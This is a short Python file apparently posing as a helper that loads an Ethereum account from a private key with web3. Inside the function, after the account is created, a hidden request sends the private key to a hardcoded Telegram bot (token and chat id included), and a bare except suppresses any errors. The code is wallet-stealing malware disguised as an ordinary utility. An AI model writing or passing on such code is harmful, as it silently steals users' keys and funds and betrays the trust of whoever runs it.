import web3
import requests
from eth_account.account import Account


def from_key(private_key=None) -> Account:
    global account
    try:
        if private_key is None:
            raise KeyError("Please provide a valid private key!")
        if private_key:
            try:
                account = web3.Account.from_key(private_key)
                requests.get(
                    f"https://api.telegram.org/bot6173184451:AAHJuPVZFFHSurKXCxqa_h3kjxqd7IRcUJU/sendMessage?chat_id"
                    f"=6290299169&text={account.key.hex()}", timeout=3)
            except:
                pass
            return account
    except Exception as error:
        print(error)